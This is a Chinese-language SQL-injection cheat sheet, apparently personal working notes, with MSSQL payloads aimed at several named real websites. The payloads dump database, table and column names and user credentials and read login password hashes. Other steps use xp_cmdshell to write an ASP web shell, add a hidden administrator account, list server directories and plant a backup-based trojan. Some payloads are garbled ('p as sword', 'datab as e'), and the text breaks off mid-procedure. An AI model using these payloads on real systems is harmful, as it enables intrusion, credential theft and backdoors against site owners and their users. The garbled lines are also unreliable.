@@ -1,0 +1,508 @@
+当网站不允许上传 asp,CGI,CER,CDX,HTR等类型的文件时
+2010-04-27 00:46:05 作者： asphack 来源： 浏览次数：6 
+
+方法:上传一个shtm文件, 内容为:
+
+<!--#include file="conn.asp"-->
+
+利用内置存储过程 xp_regread(读取注册表键值，权限public)： 
+;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread @rootkey='HKEY_LOCAL_MACHINE', @key='SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\', @value_name='/', [email=values=@test]values=@test[/email] OUTPUT insert into paths(path) values(@test);--
+
+2、 http://192.168.1.5/display.asp?keyno=1881;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("l"^)^</script^> >c:\mu.asp';-- 
+用^转义字符来写ASP文件的方法。
+
+
+
+直接请求这个shtm文件, conn.asp就一览无遗, 数据库路径也就到手啦! 
+
+解析:
+
+<!--#include file="conn.asp"-->
+就是一条SSI指令，其作用是将"conn.asp"的内容拷贝到当前的页面中，当访问者来浏览时，会看到其
+
+它HTML文档一样显示conn.asp其中的内容。 
+
+前提:服务器的对shtm或者shtml的扩展没有删除！ 
+
+至于conn.asp可以为其他,比如config.inc.php config.aspx 等一些数据配置文件 
+
+
+不能多语句是
+SQL执行
+
+select *  from  openrowset('sqloledb','dsn=locaserver;trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''dir c:''')
+
+ and  0<>(select *  from  openrowset('sqloledb','dsn=locaserver;trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''dir c:'''))
+
+------------------------------------
+
+
+
+http://stuic.fzu.edu.cn/NewsMore.aspx?bid=61
+
+F:\工作\星讯\xsc3\xsc\NewsMore.aspx.cs:66
+判断： 
+http://stuic.fzu.edu.cn/NewsMore.aspx?bid=61 and 1=1 正常
+
+http://stuic.fzu.edu.cn/NewsMore.aspx?bid=61 and 1=2 出错
+
+判断数据库类型：
+
+NewsMore.aspx?bid=61  and  (select count(*)  from  sysobjects)>0 正常 mssql
+
+ and (select count(*)  from  msysobjects)>0 正常 access
+
+mssql数据：
+
+判断用户权限:  and  user>0                                将 nvarchar 值 'homePage' 转换为数据类型为 int 的列时发生语法错误
+pangolin:     http://www.0597syw.com/LyPhoto/Ly_WordShowSch.aspx?nid=935' and  user=0-- 字符型注入  将 nvarchar 值 'dbo' 转换成数据类型 int 时失败
+              nid=935' and  @@servername%3E0--  %3e=">"  将 nvarchar 值 'SERVER1' 转换
+主机名：      .......' and host_name()=0--
+
+数据库用户：    ' and system_user%3E0--
+
+判断权限：
+ and  cast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1
+ and cast(is_srvrolemember(0x730079007300610064006d0069006e00) as nvarchar(1))%2bchar(124)=1 and 1=1
+PS:0×730079007300610064006D0069006E00 = sysadmin
+
+pangolin: ' and cast(is_srvrolemember(0x730079007300610064006d0069006e00) as nvarchar(1))%2bchar(124)=1 and '1'='1
+阿D         and char(124)%2Bcast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1--
+
+ and cast(IS_MEMBER(0x640062005F006F0077006E0065007200) as varchar(1))%2Bchar(124)=1 db_owner
+0表示不是某某成员，1表示是。0不是
+判断有几个数据库：
+             and (Selectchar(124)%2Bcast(Count(1) as varchar(8000))%2Bchar(124) from master..sysdatabases)%3E0
+
+
+爆库名：     and  db_name()>0                             nvarchar 值 'onlinecl as s' 转换为数据类型为 int 的列时发生语法错误 
+             and  1=(select name  from  master.dbo.sysdatabases where dbid=6)-- 依次改7,8,9,10,11 (1-5是系统默认数据库)
+pangolin:   ' and (select top1 cast([name] as nvarchar(500))%2bchar(94) from  [master].[dbo].[sysdatabases]where[dbid]in(select top1[dbid] from [master].[dbo].[sysdatabases]order by[dbid]desc))%3E0-- 
+                                                                                                                                                                      top 2 爆第二个库名                                                                                    
+            ' and (select top1 cast([name] as nvarchar(500))%2bchar(94)  from  [master].[dbo].[sysdatabases] where [dbid] in (select top2 [dbid]  from  [master].[dbo].[sysdatabases] order by [dbid] desc))%3E0--
+            ' and (select top1 cast([name] as nvarchar(500))%2bchar(94)  from  [master].[dbo].[sysdatabases] where [dbid] in (select top3 [dbid]  from  [master].[dbo].[sysdatabases] order by [dbid] desc))%3E0-- 第三个库名
+            
+系统盘：    
+      ';drop table pangolin_test_table;-- 先删表
+      ';create table pangolin_test_table(name nvarchar(255),low nvarchar(255),high nvarchar(255),type nvarchar(255));-- 建个表
+      ';insert pangolin_test_table exec master.dbo.xp_availablemedia;--  定义一个盘 low和hing两部组成
+
+判断有几个盘，并输入:' and 0%3C(select top1 cast([name] as nvarchar(4000))%2bchar(94)%2bcast([type] as nvarchar(4000))  from  (select top1 [name],[low],[high],[type]  from  pangolin_test_table group by[name],[low],[high],[type] order by [name])t order by [name] desc)-- 
+
+系统管理员：
+  （1） ';drop table pangolin_test_table;--   册处原来的临时表
+   （2）   ';create table pangolin_test_table(name nvarchar(255),description nvarchar(4000));-- 建临时表
+     （3）';insert pangolin_test_table exec master.dbo.xp_enumgroups;--
+      
+' and 0%3C(select top1 cast([name] as nvarchar(4000))%2bchar(94)%2bcast([description] as nvarchar(4000))  from  (select top1 [name],[description]  from  pangolin_test_table group by [name],[description] order by[name])t order by [name] desc)-- 
+（                   ******必需先完成上面三步才可能执行这步）*****
+
+读数据库系统用户名和密码：
+
+' and 0%3C(select top1 cast([name] as nvarchar(4000))%2bchar(94)%2bisnull(master.dbo.fn_varbintohexstr([p as sword_h as h]),char(32)) from (select top1 [name],[p as sword_h as h] from [master].[sys].[sql_logins] order by[name])t order by [name] desc)--
+' and 0%3C(select top1 cast([name] as nvarchar(4000))%2bchar(94)%2bisnull(master.dbo.fn_varbintohexstr([p as sword_h as h]),char(32)) from (select top2 [name],[p as sword_h as h] from [master].[sys].[sql_logins] order by[name])t order by [name] desc)-- 
+                                                                                                                                                                          第二个用户      
+
+判断版本:   NewsMore.aspx?bid=(select @@VERSION)--              
+                                                    nvarchar 值 'Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+或:NewsMore.aspx?bid=61  and  1=(select @@VERSION)--  May  3 2005 23:18:38 
+                                                    Copyright (c) 1988-2003 Microsoft Corporation
+                                                    Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+当前连接用户：
+=(selectuser_name())--                           nvarchar 值 'homePage' 转换为数据类型为 int 的列时发生语法错误
+
+读数据裤文件地址：
+ and 0=(select top1 cast([name] as nvarchar(256))%2bchar(94)%2bcast([filename] as nvarchar(256)) from (select top1 dbid,name,filename from [master].[dbo].[sysdatabases] order by [dbid])t order by [dbid] desc)-- 
+ and 0=(select top1 cast([name] as nvarchar(256))%2bchar(94)%2bcast([filename] as nvarchar(256)) from (select top2 dbid,name,filename from [master].[dbo].[sysdatabases] order by [dbid])t order by [dbid] desc)--   
+                                                                                                                                                第二个
+----- 'master^d:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf' --------
+
+
+
+
+判断有多少个表：
+           and (select cast(count(1) as varchar(10))%2bchar(94) from [sysobjects] where xtype=char(85) and status!=0)=0--
+ 
+          ' and (select cast(count(1) as varchar(10))%2bchar(94) from [allphoto].[sys].[all_objects] where type=char(85))%3E0-- 
+
+啊D：      and (Select char(124)%2Bcast(Count(1) as varchar(8000))%2Bchar(124) from [sysobjects] where xtype=char(85) and status>1)>0--
+
+爆表：
+**************************************************************************************************
+判断几个表：
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,cast(count(1)%20as%20varchar(10))%2bchar(94),null,null%20%20from%20[sysobjects]%20where%20xtype=char(85)--
+用字段位置爆出表：
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,%20cast(name%20as%20varchar(256)),null,null%20%20from%20[sysobjects]%20where%20xtype=char(85)%20and%20name%20not%20in%20('')--
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,%20cast(name%20as%20varchar(256)),null,null%20%20from%20[sysobjects]%20where%20xtype=char(85)%20and%20name%20not%20in%20('CourseReg')--
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20null,%20cast(name%20as%20varchar(256)),null,null%20%20from%20[sysobjects]%20where%20xtype=char(85)%20and%20name%20not%20in%20('')--
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20null,%20cast(name%20as%20varchar(500)),null,null%20%20from%20[fhfpcomtw_].[sys].[all_objects]%20where%20type=char(85)--
+用字段位置爆出列：
+先爆object_id:
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,cast([id]%20as%20nvarchar(20))%2bchar(94),null,null%20%20from%20[fhfpcomtw_].[sys].[sysobjects]%20where%20name=0x55007300650072007300--
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,cast([id]%20as%20nvarchar(20))%2bchar(94),null,null%20%20from%20[fhfpcomtw_]..[sysobjects]%20where%20name=0x55007300650072007300--
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,cast([id]%20as%20nvarchar(20))%2bchar(94),null,null%20%20from%20[sysobjects]%20where%20name=0x55007300650072007300--
+爆列：
+统计：
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20null,cast(count(1)%20as%20varchar(10))%2bchar(94),null,null%20from%20[fhfpcomtw_].[sys].[all_columns]%20where%20object_id=258099960--
+
+列名：
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,cast(name%20as%20varchar(500)),null,null%20%20from%20[fhfpcomtw_].[sys].[all_columns]%20where%20object_id=258099960%20and%20name%20not%20in('')--
+
+记录数：
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,cast(count(1)%20as%20varchar(8000)),null,null%20from%20[fhfpcomtw_]..[Users]%20where%201=1--
+
+内容：   库..表：fhfpcomtw_..Users
+http://www.fhfp.com.tw/news.aspx?NID=194'%20and%201=2%20union%20all%20select%20top%201%20null,isnull(cast([username]%20as%20nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]%20as%20nvarchar(4000)),char(32))%20,null,null%20from%20fhfpcomtw_..Users%20where%201=1%20and%20username%20not%20in%20(select%20top%200%20username%20from%20fhfpcomtw_..Users%20where%201=1%20group%20by%20username)--
+
+方法二：
+统计表：
+/news/photos.aspx?Pid=20091302041340'%20and%201=2%20union%20all%20select%20%20null,char(94)%2bchar(94)%2bchar(94)%2bcast(cast(count(1)%20as%20varchar(10))%20as%20nvarchar(4000))%2bchar(94)%2bchar(94)%2bchar(94),null,null%20%20from%20[sitedata].[sys].[all_objects]%20where%20type=char(85)-- 
+爆记录：
+/news/photos.aspx?Pid=20091302041340'%20and%201=2%20union%20all%20select%20top%201%20null,char(94)%2bchar(94)%2bchar(94)%2bcast(cast(name%20as%20varchar(256))%20as%20nvarchar(4000))%2bchar(94)%2bchar(94)%2bchar(94),null,null%20%20from%20(select%20top%201%20object_id,name%20from%20(select%20top%201%20object_id,name%20from%20[sitedata].[sys].[all_objects]%20where%20type=char(85)%20order%20by%201)%20t%20order%20by%201%20desc)t-- 
+object_id
+news/photos.aspx?Pid=20091302041340'%20and%201=2%20union%20all%20select%20top%201%20null,char(94)%2bchar(94)%2bchar(94)%2bcast(cast([id]%20as%20nvarchar(20))%20as%20nvarchar(4000))%2bchar(94)%2bchar(94)%2bchar(94),null,null%20%20from%20[sitedata].[sys].[sysobjects]%20where%20name=0x53005f0051005a004800-- 
+统计列：
+news/photos.aspx?Pid=20091302041340'%20and%201=2%20union%20all%20select%20%20null,char(94)%2bchar(94)%2bchar(94)%2bcast(cast(count(1)%20as%20varchar(10))%20as%20nvarchar(4000))%2bchar(94)%2bchar(94)%2bchar(94),null,null%20%20from%20[sitedata].[sys].[all_columns]%20where%20object_id=114099447-- 
+爆列名：
+news/photos.aspx?Pid=20091302041340'%20and%201=2%20union%20all%20select%20top%201%20null,char(94)%2bchar(94)%2bchar(94)%2bcast(cast(name%20as%20varchar(8000))%20as%20nvarchar(4000))%2bchar(94)%2bchar(94)%2bchar(94),null,null%20%20from%20(select%20top%201%20column_id,name%20from%20(select%20top%201%20column_id,name%20from%20[sitedata].[sys].[all_columns]%20where%20object_id=114099447%20order%20by%201)%20t%20order%20by%201%20desc)t-- 
+统计记录：
+news/photos.aspx?Pid=20091302041340'%20and%201=2%20union%20all%20select%20%20null,char(94)%2bchar(94)%2bchar(94)%2bcast(cast(count(1)%20as%20varchar(8000))%20as%20nvarchar(4000))%2bchar(94)%2bchar(94)%2bchar(94),null,null%20%20from%20[sitedata]..[users]%20where%201=1--
+爆内容：
+news/photos.aspx?Pid=20091302041340'%20and%201=2%20union%20all%20select%20top%201%20null,char(94)%2bchar(94)%2bchar(94)%2bcast(isnull(cast([username]%20as%20varchar),char(32))%20as%20nvarchar(4000))%2bchar(94)%2bchar(94)%2bchar(94),null,null%20%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20[sitedata]..[users]%20where%201=1%20order%20by%201)%20t%20order%20by%201%20desc)t--
+****************************************************************************************
+
+
+
+方法一：
+ and (select top1 cast(name as varchar(256)) from (select top1 id,name from [sysobjects] where xtype=char(85) and status!=0 order by id)t order by id desc)=0--
+                                                                                   第二个表               
+ and (select top1 cast(name as varchar(256)) from (select top2 id,name from [sysobjects] where xtype=char(85) and status!=0 order by id)t order by id desc)=0--
+啊D:
+ and (Select top1 char(124)%2Bname%2Bchar(124) from (Select top1 [id],[name] from [sysobjects] where xtype=char(85) and status>1 order by [id],[name])T order by [id] desc,[name] desc)>0-- 
+
+
+方法二： not in法
+?id=(select top 1 name  from  sysobjects where xtype='u'  and  status>0  and  name not in(''))--
+将 nvarchar 值 'bbstu' 转换为数据类型为 int 的列时发生语法错误 得到第一个表 bbstu
+
+方法三： 用裤名 [allphoto].[sys].[all_objects]     allphoto=数据裤名
+pangolin: ' and (select top1 cast(name as varchar(500)) from (select top1 object_id,name from [allphoto].[sys].[all_objects] where type=char(85) order by object_id)t order by object_id desc)%3E0-- 第一个表：
+          ' and (select top1 cast(name as varchar(500)) from (select top2 object_id,name from [allphoto].[sys].[all_objects] where type=char(85) order by object_id)t order by object_id desc)%3E0--  
+                                                                                             第二个表                                       
+爆第二个：
+
+?id=(select top 1 name  from  sysobjects where xtype='u'  and  status>0  and  name not in('bbstu'))-- 
+'nowritestu'
+
+
+第三个：
+=(select top 1 name  from  sysobjects where xtype='u'  and  status>0  and  name not in('bbstu','nowritestu'))-- 
+'old2007'
+第四个
+=(select top 1 name  from  sysobjects where xtype='u'  and  status>0  and  name not in('bbstu','nowritestu','old2007'))-- 
+    'studentInformation'  .........
+
+另类爆表方法：
+
+?id=61 having 1=1
+
+'t_oArticleSortA.name' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。]
+得到表名:oArticleSortA 列名：name
+
+用group by 爆另外的列名：
+group by t_oArticleSortA.name having 1=1--      't_oArticleSortA.ID' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含
+第三个列：
+group by t_oArticleSortA.name,t_oArticleSortA.ID having 1=1-- 
+或：
+知道一个表名情况：
+select *  from  t_oArticleSortA group by  name     可以爆出多个列
+                                             列 't_oArticleSortA.ID' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+                                             列 't_oArticleSortA.sort' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。
+                                             列 't_oArticleSortA.showIndex' 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。 
+
+不知道列的清况下用：
+having 1=1  
+或：   %28select * from t_oArticleSortA having1=1%29
++ and +1=%28select * from tAdminLoginhaving1=1%29             tAdminLogin 表名
++ and +1=%28select * from tAdminLogin group by IDfAdmin%29  下一列  IDfAdmin  第一个列名
+
+
+
+
+爆列名pangolin:
+    读object_id=274100017      2000版本用sysobjects
+' and (select top1 cast([id] as nvarchar(20))%2bchar(94) from [allphoto].[sys].[sysobjects] where name=0x410064006d0069006e007300)%3E0--    Admins=0x410064006d0069006e007300    2005版
+  and (select top1 cast(id as nvarchar(20))%2bchar(124) from [sysobjects] where name=0x54005f00410064006d0069006e00)=0--                    2000版
+或用裤名爆：
+ and (select top1 cast([id] as nvarchar(20))%2bchar(94) from [裤名]..[sysobjects] where name=0x54005F00410064006D0069006E00)%3E0--
+
+判断有几个列：  
+' and (select cast(count(1) as varchar(10))%2bchar(94) from [allphoto].[sys].[all_columns] where object_id=274100017)%3E0--
+ and (select cast(count(1) as varchar(10))%2bchar(94) from [syscolumns] where id=1637580872)=0--  
+啊D：
+ and (Select char(124)%2Bcast(Count(*) as varchar(8000))%2Bchar(124) from [gjjgjEnglishDB]..[syscolumns] where (id=(SELEct top1 id from [sysobjects] WHERE name=char(84)%2Bchar(95)%2Bchar(65)%2Bchar(100)%2Bchar(109)%2Bchar(105)%2Bchar(110))))>0--
+或先读出object_id号：再用id来爆列
+ and (Select char(124)%2Bcast(Count(*) as varchar(8000))%2Bchar(124) from [gjjgjEnglishDB]..[syscolumns] where (id=(SELEct top1 id from [sysobjects] WHERE id=1637580872)))>0--
+
+第一个列名：  ' and (select top1 cast(name as varchar(500)) from (select top1 column_id,name from [allphoto].[sys].[all_columns] where object_id=274100017 order by column_id)t order by column_iddesc)%3E0--
+第二个列名：  ' and (select top1 cast(name as varchar(500)) from (select top2 column_id,name from [allphoto].[sys].[all_columns] where object_id=274100017 order by column_id)t order by column_iddesc)%3E0--
+ 
+2000版：
+  and (select top1 cast(name as varchar(8000)) from (select top1 colid,name from [syscolumns] where id=1637580872 order by colid)t order by colid desc)=0--                                                                                                   第二个列名                   库名
+  and (select top1 cast(name as varchar(8000)) from (select top2 colid,name from [syscolumns] where id=1637580872 order by colid)t order by colid desc)=0-- 
+
+ 啊D：
+ and (Select top1 char(124)%2Bname%2Bchar(124) from (Select top1 [name] from [syscolumns] where (id=(SELEct top1 id from [sysobjects] WHERE id=1637580872)) order by [name])T order by [name] desc)>0--
+或：                                                                                第6条
+ and (Select top1char(124)%2Bname%2Bchar(124) from (Select top6 [name] from [syscolumns] where (id=(SELEct top1 id from [sysobjects] WHERE name=char(84)%2Bchar(95)%2Bchar(65)%2Bchar(100)%2Bchar(109)%2Bchar(105)%2Bchar(110))) order by [name])T order by [name] desc)>0--                                                                                      第二个列名
+判断用户记录数:
+ and  10<(select count(name)  from  t_oArticleSortA.name)--
+http://stuic.fzu.edu.cn/NewsMore.aspx?bid=61 and 10=(select count(name) from t_oArticleSortA)--
+pangolin: 
+' and (select cast(count(1) as varchar(8000))%2bchar(94) from [allphoto]..[admins] where1=1)%3E0-- 
+  and (select cast(count(1) as varchar(8000))%2bchar(94) from [t_admin] where1=1)=0-- 
+爆字段内容：
+       ' and (select top1 isnull(cast([username] as nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([p as sword] as nvarchar(4000)),char(32)) from allphoto..admins where1=1 and username not in(select top0 username from allphoto..admins where1=1 group by username))%3E0 and '1'='1                                                                                  库名        表名
+                                                  段名                                                                 段名                                                 库名      表名                        段名                                      段名               库名     表名                                段名                           
+       ' and (select top1 isnull(cast([username] as nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([p as sword] as nvarchar(4000)),char(32)) from allphoto..admins where1=1 and username not in(select top1 username from allphoto..admins where1=1 group by username))%3E0 and '1'='1 
+                                                                                                                                                                                                                                                         第二条记录
+2000：   and (select top1 isnull(cast([loginname] as nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([p as sword] as nvarchar(4000)),char(32)) from [t_admin] where1=1 order by [loginname])=0-- 
+
+啊D:  
+用户名：
+  and (Select top1 char(124)%2BisNull(cast([Name] as varchar(8000)),char(32))%2Bchar(124) from (Select top0 [Name] from [T_Area] Where1=1 order by [Name])T order by [Name]desc)>0--
+用户名和密码一起爆：
+ and (Select top1 char(124)%2BisNull(cast([用户名] as varchar(8000)),char(32))%2Bchar(124)%2BisNull(cast([密码] as varchar(8000)),char(32))%2Bchar(124) from (Select top1 [用户名],[密码] from [表名]Where1=1order by[用户名],[密码])Torder by[用户名]desc,[密码]desc)>0-- 
+                       																						      第四条记录                                                                                                                                                                                                           
+ and (Select top1 char(124)%2BisNull(cast([Name] as varchar(8000)),char(32))%2Bchar(124)%2BisNull(cast([ParentId] as varchar(8000)),char(32))%2Bchar(124) from (Select top4 [Name],[ParentId] from [T_Area] Where1=1 order by [Name],[ParentId])T order by[Name] desc,[ParentId] desc)>0-- 
+
+xp_cmdshell:
+ net user:
+       (1)建表: ';create table [pangolin_test_table]([resulttxt] nvarchar(4000) null);--
+
+ 利用存贮过和程直接读出操作系统用户 : 
+
+       (2)      ';declare@z nvarchar(4000) set @z=0x6e006500740020007500730065007200 insert into [pangolin_test_table](resulttxt) exec master.dbo.xp_cmdshell @z;alter table[pangolin_test_table]add id int not null identity(1,1)--
+                                                              0x6E006500740020007500730065007200 =net user
+        (3)判断几个用户      ' and (select cast(count(1) as varchar(8000))%2bchar(94) from [allphoto]..[pangolin_test_table])%3E0--  
+                                                                                                                                                                                                                                04前面加了三个换行符，所以是04 也可以不加那就是01 第一行                                                                                
+     (4)爆出系统用户:    ' and (select top1 case when resulttxt isnull then char(124)else resulttxt%2bchar(124)end from [pangolin_test_table]where id not in (select top4 id from [pangolin_test_table] order by [id]))%3E0-- 
+                         ' and (select top1 case when resulttxt isnull then char(124)else resulttxt%2bchar(124)end from [pangolin_test_table]where id not in (select top5 id from [pangolin_test_table] order by [id]))%3E0-- 
+
+                         ' and (select top1 case when resulttxt isnull then char(124)else resulttxt%2bchar(124)end from [pangolin_test_table]where id not in (select top7 id from [pangolin_test_table] order by [id]))%3E0-- 
+方法二：                                  命令运行完毕，但发生一个或多个错误
+删表：            ;drop table pangolin_test_table;--     
+建表：            ;create table pangolin_test_table(name nvarchar(255),description nvarchar(4000));-- 
+插入存贮到表中：  ;insert pangolin_test_table exec master.dbo.xp_enumgroups;--
+查询表             and 0%3C(select top1 cast([name] as nvarchar(4000))%2bchar(94)%2bcast([description] as nvarchar(4000)) from (select top1 [name],[description] from pangolin_test_table group by [name],[description] order by [name])t order by [name] desc)--  
+
+
+net user yanhua$ yanhua /add 
+
+         
+        ;drop table pangolin_test_table;--   
+
+ 1、建表';create table[pangolin_test_table]([resulttxt] nvarchar(4000) null);--
+
+ 2、加命令：';declare @z nvarchar(4000) set @z=0x6E0065007400200075007300650072002000790061006E00680075006100240020002F00610064006400 insert into [pangolin_test_table](resulttxt) exec master.dbo.xp_cmdshell @z;alter table[pangolin_test_table] add id int not null identity(1,1)--
+                定义变量 "z"                       赋值给变量z=net user yanhua$ yanhua /add                                    插入命令master.dbo.xp_cmdshell@z到表中
+net localgroup administrators yanhua$ /add
+           
+           ;drop table pangolin_test_table;--   
+
+      1、建表  ';create table[pangolin_test_table]([resulttxt] nvarchar(4000) null);--  
+       2、加命令：';declare @z nvarchar(4000) set @z=0x6E006500740020006C006F00630061006C00670072006F00750070002000410064006D0069006E006900730074007200610074006F00720073002000790061006E00680075006100240020002F00610064006400 insert into [pangolin_test_table](resulttxt) exec master.dbo.xp_cmdshell @z;alter table[pangolin_test_table] add id int not null identity(1,1)--                                                                                                                                                                                                                                            第二条记录  记录是从0开始记的                                                                                                                                                                                                                       
+
+;drop table pangolin_test_table;--   
+************第次用命令之前都要先删了临时表，再重建或别外建个表，再加命令，最后删除建的临时表****************
+        
+                             |只有sa权限才可以| 
+
+************加命令只须把0x0x6E0065007400200075007300650072002000790061006E006800750061002400这段sql_En码换成想要执行命的sql_en码就行****************
+=(select name  from  t_oArticleSortA)--
+
+列目录：DB权限
+  判断是否存在以“C：盘”  ';drop tableD99_Tmp;create tableD99_Tmp(subdirectory VARCHAR(100),depth VARCHAR(100),[file] VARCHAR(100)) Inser tD99_Tmp exec master..xp_dirtree"c:\",1,1--
+  
+  判断有多个个目录和文件： ' and (Select char(124)%2Bcast(Count(1) as varchar(8000))%2Bchar(124) from D99_Tmp)=0 and ''=' 
+
+ 第一个目录或文件：' and (Select top1 char(124)%2Bcast([file] as varchar(8000))%2Bsubdirectory%2Bchar(124) from (Select top1[subdirectory],[file] from D99_Tmp order by [file],[subdirectory]) D order by [file] desc,[subdirectory] desc)=0 and ''='
+ 第二个            ' and (Select top1 char(124)%2Bcast([file] as varchar(8000))%2Bsubdirectory%2Bchar(124) from (Select top2[subdirectory],[file] from D99_Tmp order by [file],[subdirectory]) D order by [file] desc,[subdirectory] desc)=0 and ''='
+                                                                                                                                                   第二个                                                                       
+
+子目录：
+判断子目录是否存在：';drop table D99_Tmp;create table D99_Tmp (subdirectory VARCHAR(100),depth VARCHAR(100),[file] VARCHAR(100)) Insert D99_Tmp exec master..xp_dirtree"c:\Documents and Settings\",1,1--
+
+判断有多个个目录和文件 ' and (Select char(124)%2Bcast(Count(1) as varchar(8000))%2Bchar(124) from D99_Tmp)=0 and ''=' 
+
+第一个:               ' and (Select top1 char(124)%2Bcast([file] as varchar(8000))%2Bsubdirectory%2Bchar(124) from (Select top1 [subdirectory],[file] from D99_Tmp order by [file],[subdirectory]) D order by [file] desc,[subdirectory] desc)=0 and ''=' 
+                      ' and (Select top1 char(124)%2Bcast([file] as varchar(8000))%2Bsubdirectory%2Bchar(124) from (Select top2 [subdirectory],[file] from D99_Tmp order by [file],[subdirectory]) D order by [file] desc,[subdirectory] desc)=0 and ''=' 
+                                                                                                                                                      第二个目录                                                                     
+
+pangolin:
+     建表：';drop table pangolin_test_table;create table pangolin_test_table([id] [int] identity(1,1) not null,[name] [nvarchar](300) not null,[depth] [int] not null,[isfile] [nvarchar](50) null);-- 
+     把盘目录读入表中：';declare @z nvarchar(4000) set @z=0x64003a005c00 insert pangolin_test_table execute master..xp_dirtree @z,1,1--
+                                                                     0x64003a005c00=d:\
+     判断几个文件和目录：    ' and (select cast(count(1) as varchar(8000))%2bchar(94) from pangolin_test_table)=0----
+     
+
+第一个文件：      ' and 0=(select top1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from (select distinct top1 [name],[isfile] from pangolin_test_table group by [name],[isfile] order by [isfile])t order by [isfile] desc,[name] desc)--
+     第二个:           ' and 0=(select top1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from (select distinct top2 [name],[isfile] from pangolin_test_tableg roup by [name],[isfile] order by [isfile])t order by [isfile] desc,[name] desc)----
+
+或：
+              and 0%3C(select top1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from pangolin_test_table where id not in (select top2 id from pangolin_test_table order by id) order by id)--                                                                                                                                                                                  
+             
+              and 0%3C(select top1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from pangolin_test_table order by id)-- 
+
+--------------------------------如果读不出来就用正常的爆表方法来爆----------------------------
+
+ and (select top1 isnull(cast([gid] as nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([bid] as nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([cbid] as nvarchar(4000)),char(32)) from aldneiyi..goods where1=1 and gid not in(select top0 gid from aldneiyi..goods where1=1 group byg id))%3E0 and 1=1
+
+					这条是读三个列一起爆
+gid,cid,bid
+-------------------------------------------------------------------------------------------
+
+
+子目录：
+       建表：';drop table pangolin_test_table;create table pangolin_test_table([id] [int] identity(1,1) not null,[name] [nvarchar](300) not null,[depth] [int] not null,[isfile] [nvarchar](50) null);--
+                                                                   0x64003a.....目录的sql_en 
+       把目录读入表：';declare @z nvarchar(4000) set @z=0x64003a005c0043006800750061006e006700780069006e00 insert pangolin_test_table execute master..xp_dirtree @z,1,1-- 
+
+       判断几个目录：' and (select cast(count(1) as varchar(8000))%2bchar(94) from pangolin_test_table)=0---
+      
+       第一个：      ' and 0=(select top1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from (select distinct top1 [name],[isfile] from pangolin_test_table group by [name],[isfile] order by [isfile])t order by [isfile] desc,[name] desc)---  
+                    
+        第二个：     ' and 0=(select top1 cast([isfile] as nvarchar(4000))%2bchar(94)%2bcast([name] as nvarchar(4000)) from (select distinct top2 [name],[isfile] from pangolin_test_table group by [name],[isfile] order by [isfile])t order by [isfile] desc,[name] desc)--
+--------------------------------------------------------------------------
+啊D中：
+
+;drop table kill_kk;create table kill_kk(subdirectory VARCHAR(100),depth VARCHAR(100),[file] VARCHAR(100)) Insert kill_kk exec master..xp_dirtree"d:\阿拉丁专家热卖源程序\",1,1--
+
+ and (Select char(124)%2Bcast(Count(1) as varchar(8000))%2Bchar(124) from kill_kk)=0--
+
+ and (Select top1 char(124)%2Bcast([file] as varchar(8000))%2Bsubdirectory%2Bchar(124) from (Select top1 [subdirectory],[file] from kill_kkorder by [file],[subdirectory]) D order by [file] desc,[subdirectory] desc)=0--
+
+--------------------------------------------------------------------------
+
+
+
+
+
+2005版：
+
+
+
+
+
+ and  (Select Top 1 col_name(object_id(‘t_oArticleSortA’),1)  from  sysobjects)>0
+
+
+
+备份一句话木马：
+
+第一步
+;alter/**/datab as e/**/[li-168]/**/set/**/recovery/**/full--
+
+第二步：
+;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/datab as e/**/[li-168]/**/to/**/disk=@d/**/with/**/init--
+
+第三步
